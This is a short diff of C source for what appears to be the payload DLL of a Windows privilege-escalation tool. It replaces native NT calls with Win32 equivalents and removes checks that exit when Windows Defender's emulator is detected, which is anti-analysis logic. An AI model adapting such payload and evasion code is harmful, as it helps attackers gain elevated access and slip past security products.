@@ -154,7 +154,7 @@ VOID DefaultPayload(
     PFNCREATEPROCESSASUSERW pCreateProcessAsUser;
 
     if (!NT_SUCCESS(ucmCreateSyncMutant(&g_SyncMutant))) {
-        RtlExitUserProcess(STATUS_SUCCESS);
+        ExitProcess(0);
         return;
     }
 
@@ -199,7 +199,7 @@ VOID DefaultPayload(
 
     NtClose(g_SyncMutant);
 
-    RtlExitUserProcess(ExitCode);
+    ExitProcess(0);
 }
 
 /*
@@ -221,12 +221,9 @@ BOOL WINAPI DllMain(
 
     ucmDbgMsg(LoadedMsg);
 
-    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
-        RtlExitUserProcess('Foff');
-
     if (fdwReason == DLL_PROCESS_ATTACH) {
 
-        LdrDisableThreadCalloutsForDll(hinstDLL);      
+        DisableThreadLibraryCalls(hinstDLL);
         DefaultPayload();
 
     }
@@ -247,9 +244,6 @@ VOID WINAPI EntryPointExeMode(
 {
     BOOL IsDll = RtlImageNtHeader(GetModuleHandle(NULL))->FileHeader.Characteristics & IMAGE_FILE_DLL;
     if (!IsDll) {
-        if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-            RtlExitUserProcess('foff');
-        }
         DefaultPayload();
     }
 }
